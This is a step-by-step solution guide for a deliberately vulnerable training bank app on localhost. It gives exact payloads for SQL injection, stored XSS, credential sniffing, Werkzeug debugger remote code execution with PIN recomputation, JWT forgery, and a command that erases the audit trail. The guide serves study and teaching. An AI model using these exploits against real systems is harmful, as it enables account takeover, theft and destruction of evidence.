# Answers.md

**This is the full solution guide — every scoreboard challenge, spelled out
step by step, with exact payloads.** If you're treating this like a CTF,
stop here and use `Hackers.md` instead. This document exists for anyone
studying the app, teaching from it, or genuinely stuck.

Server assumed running at `http://127.0.0.1:5005/`. Scoreboard/flag
tracking is per-session (a cookie), so solving something in one browser
tab/`curl` cookie jar won't show as solved in another.

---

## 1. Get Permission First (★☆☆☆☆)

Click **"Chat with Management & IT"** on the login page (`/chat`), type
anything, and submit. The bot always replies "You are allowed to."
regardless of what you send — sending any message at all marks this
solved.

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/chat \
  --data-urlencode "message=can I test this?"
```

---

## 2. Read robots.txt (★☆☆☆☆)

Just request it directly — nothing links to it from the UI, but the
route exists and hitting it is the whole challenge.

```
curl -c cookies.txt -b cookies.txt http://127.0.0.1:5005/robots.txt
```

It also happens to leak the hardcoded backdoor path (`/admin_panel1234510`),
which challenge 6 needs.

---

## 3. SQL Injection Login Bypass (★★☆☆☆)

`/login` builds its SQL query with raw string interpolation:

```python
query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(...)
```

Comment out the password check entirely with `--`:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=internAdmin@fakebank.com'--" \
  --data-urlencode "password=anything"
```

You're now logged in as `internAdmin@fakebank.com` without knowing its
real password. `' OR '1'='1` also works and logs you in as whichever row
SQLite returns first.

---

## 4. Crack a Password Hash (★★☆☆☆)

The login form isn't the only injectable input — the **"Check recipient
exists"** button on the transfer page hits `/check-recipient`, which has
the same raw-string-interpolation bug but echoes the matched column
straight back instead of just true/false. UNION-inject to dump a
password hash directly:

```
curl -G http://127.0.0.1:5005/check-recipient \
  --data-urlencode "username=x' UNION SELECT password FROM users WHERE username='crackme@fakebank.com'-- "
```

Returns `{"exists": true, "match": "0d107d09f5bbe40cade3de5c71e9e9b7"}` —
that's `md5('letmein')`, an unsalted, wordlist-top password. Crack it
offline (`john --format=raw-md5`, `hashcat -m 0`, or just recognize it),
then log in for real:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=crackme@fakebank.com" \
  --data-urlencode "password=letmein"
```

It's the **real** login (matching password hash), not the injection
bypass, that marks this one solved.

---

## 5. Stored XSS via Username (★★☆☆☆)

The dashboard renders your username with Jinja's `| safe` filter,
disabling auto-escaping. Register an account whose username is an
HTML/JS payload, then log in as it:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/register \
  --data-urlencode "username=<img src=x onerror=alert(1)>" \
  --data-urlencode "password=whatever123"

curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=<img src=x onerror=alert(1)>" \
  --data-urlencode "password=whatever123"
```

Avoid `'` in the payload — it'll break the vulnerable `/login` query
before you even get to `/dashboard`. Visiting `/dashboard` while logged
in as this account is what marks it solved (detected server-side by
matching the username against an XSS-payload-like pattern).

---

## 6. Compute the Daily Gift Card Code (★★☆☆☆)

The transfer page advertises a "secret" gift card code you get by
signing up for a newsletter. It's fake — the real code is just
`md5(today's date, formatted YYYY-MM-DD)`, identical for every visitor,
all day:

```
python3 -c "import hashlib, datetime; print(hashlib.md5(datetime.datetime.now().strftime('%Y-%m-%d').encode()).hexdigest())"
```

Use that as the `gift_number` field on a transfer for any amount/recipient:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/transfer \
  --data-urlencode "recipient=anyone" \
  --data-urlencode "amount=5" \
  --data-urlencode "gift_number=<the computed hash>"
```

The recipient's balance actually goes up by $250 (a fixed
`GIFT_CARD_VALUE`, not whatever you put in `amount`), with no debit to
you — logged as a real transaction. Using the real code (not just any
string) is what marks the challenge solved. The deeper flaw: the code
is not single-use or tied to a specific redemption at all, so the same
code works over and over, to any recipient, for unlimited free money —
run the same request again and watch the balance keep climbing.

---

## 7. Find the Hardcoded Backdoor (★★☆☆☆)

Just visit it. `/robots.txt` (challenge 2) names the exact path:

```
curl -c cookies.txt -b cookies.txt http://127.0.0.1:5005/admin_panel1234510
```

Logs you in as `internAdmin@fakebank.com` with zero credentials and no
auth check at all.

---

## 8. Sniff Credentials Off the Wire (★★★☆☆)

This app only ever serves plain HTTP — every `/login` POST, including
the password, travels the network unencrypted. A background thread
(`start_credential_bot()`) logs `TheMainAdmin@fakebank.com` in with its
real (strong, never-displayed) password every 20 seconds, purely so
there's always real cleartext traffic to capture.

Run a packet capture while it fires (needs root, run this yourself,
not something Claude can do for you):

```
sudo tcpdump -i lo0 -A 'tcp port 5005 and (dst port 5005)' -s 0
```

Watch for a `POST /login` body containing `username=TheMainAdmin%40fakebank.com&password=...`
Once you have the real password, log in with it — via the normal
`/login` **or** the `/api/login` API (both mark this solved):

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=TheMainAdmin@fakebank.com" \
  --data-urlencode "password=<captured password>"
```

---

## 9. Remote Code Execution via Debug Console (★★★★★)

`app.run(debug=True, ...)` means any uncaught exception serves Werkzeug's
interactive debugger — a live Python shell per stack frame, gated only
by a PIN printed to the server's own console.

**Step 1 — trigger a crash.** Use a UNION-based SQL injection to log in
as a username that doesn't correspond to a real account. `dashboard()`
re-queries the DB by session username and crashes on the `None` result:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=x' UNION SELECT 1,'ghost@fakebank.com','irrelevant',100-- " \
  --data-urlencode "password=whatever"

curl -c cookies.txt -b cookies.txt http://127.0.0.1:5005/dashboard -o crash.html
```

**Step 2 — extract the secret and a frame id** from the crash page:

```
grep -o 'SECRET = "[^"]*"' crash.html
grep -o 'frame-[0-9]*' crash.html | head -1
```

**Step 3 — authenticate with the PIN.** In this local setup you can just
read it off the server's own console/stdout when it started. In a real
attack you generally wouldn't have that — but the PIN doesn't actually
need it. It isn't randomly generated per run; it's deterministically
computed from a handful of environment facts (the OS username running
the process, the app's module name, the absolute path to `app.py`, the
machine's MAC address, and a machine-id value), which is exactly why
this app's PIN stays identical across every restart. If an attacker can
learn or guess those inputs — very plausible in containerized
deployments with predictable defaults like a `root` user and a
conventional path such as `/app/app.py` — they can recompute the exact
same PIN completely offline. Public PIN-bruteforce tools target this
recomputation, not the 9-digit number directly (Werkzeug does rate-limit
naive online guessing against `pinauth`, see the `"exhausted"` field in
its response, but that doesn't stop the offline approach). The debugger
also tracks PIN-auth success in a cookie, so this request and step 4
**must reuse the same cookie jar** or the auth won't carry over:

```
curl -c dbg.txt -b dbg.txt "http://127.0.0.1:5005/?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>"
```

**Step 4 — execute code**, e.g. read the flag file (same `dbg.txt` jar):

```
curl -c dbg.txt -b dbg.txt -G http://127.0.0.1:5005/ \
  --data-urlencode "__debugger__=yes" \
  --data-urlencode "cmd=open('.rce_flag').read()" \
  --data-urlencode "frm=<FRAME_ID>" \
  --data-urlencode "s=<SECRET>"
```

**Step 5 — submit the flag** on the scoreboard page (the only challenge
that needs a typed flag, since this exploit happens entirely at the
WSGI layer, outside Flask's own routing — the app genuinely can't
observe it happening):

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/scoreboard93217 \
  --data-urlencode "flag=<the flag string from step 4>"
```

**Bonus, not a separate challenge:** you now have full read/write access
to `fakebank.db`. `sqlite3.connect('fakebank.db').execute("DELETE FROM transactions").connection.commit()`
run through the same console erases the audit trail — including the IP
address logged on every transfer — since there's no audit-log
protection at all.

---

## 10. Reach the Hidden Card-Viewing Feature (★★★☆☆)

The dashboard always includes a link to `/view-all-cards`, for **every**
logged-in user, hidden with a screen-reader-only CSS class
(`.invisible-admin-link`) rather than only being rendered for the right
account. View-source or DevTools on any dashboard reveals it:

```
curl -c cookies.txt -b cookies.txt http://127.0.0.1:5005/dashboard | grep view-all-cards
```

The route itself correctly checks `session['username'] == 'TheMainAdmin@fakebank.com'`,
so finding the link only gets you the URL. Become that account the same
way as challenge 3 (SQL injection bypass), then visit it:

```
curl -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:5005/login \
  --data-urlencode "username=TheMainAdmin@fakebank.com'--" \
  --data-urlencode "password=x"

curl -c cookies.txt -b cookies.txt http://127.0.0.1:5005/view-all-cards
```

Dumps every seeded account's hashed (MD5) credit card number.

---

## 11. Forge an API Token (★★★★☆)

`/api/login` and `/api/balance` are a token-based API for
scripts/automation, separate from the cookie session, issuing a JWT
instead. `/api/balance` is vulnerable two independent ways.

**Path A — `alg: none`.** The server trusts whatever algorithm a token's
own header claims instead of pinning to one server-side. Build a token
by hand — no library, no signature needed:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"username": "TheMainAdmin@fakebank.com"}).encode())
token = f"{header}.{payload}."
print(token)
```

```
curl http://127.0.0.1:5005/api/balance -H "Authorization: Bearer <token>"
```

**Path B — reused signing secret.** Tokens are signed with
`app.secret_key`, the exact same hardcoded value (`'not-a-real-secret'`)
used for session cookies — sitting in this project's public GitHub
source. Sign your own, fully valid token independently:

```python
import jwt  # pip install pyjwt
token = jwt.encode({"username": "TheMainAdmin@fakebank.com"}, "not-a-real-secret", algorithm="HS256")
print(token)
```

Same request either way — returns `TheMainAdmin`'s real balance
($25,000,000) with no real authentication. Both were also verified
working entirely client-side in a browser via `fetch()` and
`crypto.subtle` (no Python needed at all for Path B either — HMAC-SHA256
is native to the browser).

If you already captured `TheMainAdmin`'s real password via challenge 8,
`/api/login` with the real password issues a fully legitimate token
instead — that's expected, not a shortcut around anything, and it
doesn't mark this specific challenge solved (only a token that was
never actually issued by the server does, tracked via the
`issued_tokens` table).

---

## Other ways to discover things not tied to a specific challenge

- **The scoreboard itself** (`/scoreboard93217`) isn't linked anywhere,
  including `robots.txt`. No clean discovery path is provided on
  purpose — guessing, brute-forcing the URL (gobuster/ffuf handle a
  numeric suffix on a real word easily), or reading the source are all
  fair game. Once found once per session, a hidden shortcut back to it
  appears on the login page the same way (view-source only).
- **Leaked `app.secret_key` without reading GitHub:** `flask-unsign`
  can crack it directly from any session cookie you already have,
  offline, against a wordlist — no source access needed. Or, once you
  have RCE (challenge 9), just read `app.secret_key` out of the running
  process directly.
